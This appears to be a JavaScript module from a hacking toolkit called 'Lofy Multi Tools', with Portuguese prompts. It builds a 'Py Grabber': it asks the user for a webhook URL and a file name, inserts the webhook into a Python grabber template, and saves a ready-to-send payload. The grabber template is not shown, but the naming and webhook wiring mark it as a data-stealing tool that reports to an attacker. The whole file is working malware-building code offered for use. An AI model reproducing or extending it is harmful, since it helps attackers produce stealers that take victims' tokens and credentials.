module.exports.self = function () {
process.title = "Lofy Multi Tools - Py Grabber"
const colors = require('colors'),
    fs = require('fs'),
    readline = require("readline").createInterface({
        input: process.stdin,
        output: process.stdout
    }),
    log = console.log,
    cls = console.clear


cls()


log(`\n\n
   ██████╗ ██╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
   ██╔══██╗╚██╗ ██╔╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██████╔╝ ╚████╔╝     ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
   ██╔═══╝   ╚██╔╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
   ██║        ██║       ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
   ╚═╝        ╚═╝        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
           \n\n
`.magenta)

readline.question("   [?] Webhook: ".yellow, webhook => {
    readline.question("   [?] Nome do Arquivo: ".yellow, nome => {

        fs.readFile('./Api/fs/grabber.py', 'utf8', (err, data) => {
            if (err) {
                console.error(err);
                return;
            }
            const grabber = data.replace("**WEBHOOK**", webhook)
            fs.writeFile("./Api/OpTime/" + nome + ".py", grabber, (err) => {
                if (err) console.log(err);
                else {
                    console.log("\n\n   [!] Grabber criando por sucesso!\n   [+] Salvo em Api/OpTime".green);
                    require('./Fim/index').acabou(2, "\n   [+] Grabber criado com sucesso!\n   [+] Oque você quer fazer agora?\n   [1] Tentar Novamente\n   [2] Sair".green, "", readline, "", "", "py-grabber", "")
                }
            })
        })
    })
})
}
